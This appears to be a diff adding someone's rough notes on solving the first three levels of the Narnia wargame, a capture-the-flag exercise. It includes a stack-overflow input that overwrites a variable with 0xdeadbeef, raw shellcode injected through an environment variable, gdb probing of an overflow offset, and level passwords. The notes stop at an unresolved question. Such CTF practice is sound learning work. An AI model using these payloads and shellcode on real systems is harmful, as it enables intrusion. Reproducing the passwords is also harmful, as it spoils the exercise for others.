@@ -1,0 +1,35 @@
+Narnia 0:
+Given program narnia0
+Overflows 4 chars into var after 20 characters have been entered
+Need to write “deadbeef” (hex) in ascii.
+No normal characters can accomplish this
+q=$(echo -e "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde")
+echo $q | ./narnia0
+Works but exits immediately
+(python -c 'print "a"*20+"\xef\xbe\xad\xde"'; cat) | ./narnia0
+Use cat to persist shell
+Password for narnia 1: efeidiedae
+
+Narnia 1:
+Source code requires env variable “EGG” be set
+Program executes whatever is in egg
+EGG=ls
+export EGG
+Seg fault
+Try something else, after research I need shellcode
+export EGG=`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'`
+Nairiepecu
+
+Narnia 2:
+Def a buffer overflow problem
+Seg fault at “A”*150
+Put into gdb
+run $(python -c ‘print “A”*150’)
+Seg at 0x41414141
+run $(python -c ‘print “A”*140’)
+Seg at 0x41414141
+run $(python -c ‘print “A”*135’)
+Seg at 0x00414141
+Ok here we go
+Need to find shellcode to use, could use above shellcode
+How to insert into code and find callback address?
